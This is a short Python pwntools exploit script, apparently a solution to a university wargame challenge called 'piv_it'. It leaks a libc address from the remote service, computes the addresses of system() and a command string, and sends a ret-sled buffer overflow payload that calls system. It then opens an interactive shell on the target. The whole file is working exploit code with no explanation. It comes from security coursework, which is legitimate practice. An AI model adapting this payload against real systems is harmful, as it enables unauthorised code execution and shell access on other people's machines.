#!/usr/bin/python

from pwn import *
import re

#c = process("./binaries/piv_it")
c = remote("wargames.6447.sec.edu.au", 8001)
#gdb.attach(c)

ret = 0x08048199	# ret

reply = c.recvline()
printf_got = re.search("0x(.{8})", reply).group(0)
log.info("Printf_got at: %s" % (printf_got))

printf_got = int(printf_got, 0)
system = printf_got - 0xe8d0
#system = printf_got - 0x13E50
command = printf_got + 0x11239b
#command = printf_got + 0x12B338

log.info("System at %s" % (hex(system)))
log.info("Command at %s" % (hex(command)))

ret_len = (128-12)/4 - 1
payload1 = "aa"
for i in range(ret_len):
	payload1 += p32(ret)
payload1 += p32(system)
payload1 += "AAAA"
payload1 += p32(command)
payload1 += "a"

c.sendline(payload1)

payload2 = "a"*20
c.sendline(payload2)

c.interactive()
